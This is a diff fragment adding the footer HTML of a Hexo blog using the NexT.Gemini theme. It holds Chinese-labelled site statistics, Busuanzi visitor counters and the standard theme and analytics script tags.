+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">221k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:21</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class=""></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class=""></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
